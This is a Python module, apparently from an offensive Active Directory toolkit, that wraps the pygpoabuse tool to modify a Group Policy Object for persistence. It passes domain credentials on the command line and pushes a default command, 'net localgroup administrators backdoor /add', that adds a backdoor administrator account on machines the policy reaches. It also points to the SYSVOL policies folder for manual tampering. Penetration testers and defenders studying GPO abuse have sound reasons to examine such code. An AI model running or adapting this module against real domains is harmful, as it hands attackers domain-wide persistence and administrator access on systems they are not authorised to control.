"""GPO abuse  -  backdoor via Group Policy Object modification."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.persistence.gpo_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["gpo_modification", "persistence", "code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1484.001"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None)

    print("[*] GPO Abuse: Group Policy backdoor")
    print(f"[*] Domain: {cred.domain}")

    import subprocess
    import shutil
    pygpoabuse = shutil.which("pygpoabuse") or shutil.which("pygpoabuse.py")
    if pygpoabuse:
        cmd = [pygpoabuse, "{}/{}:{}".format(cred.domain, cred.username or "", cred.password or ""),
               "-gpo-id", getattr(args, "target_dn", "") or ""]
        if dc_ip:
            cmd += ["-dc-ip", dc_ip]
        cmd += ["-command", getattr(args, "command", 'net localgroup administrators backdoor /add')]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] pyGPOAbuse not found")
    print("[*] Install: pip install pygpoabuse")
    print(f"[*] Manual: modify SYSVOL scripts in \\\\{cred.domain}\\SYSVOL\\{cred.domain}\\Policies\\")
    return 1
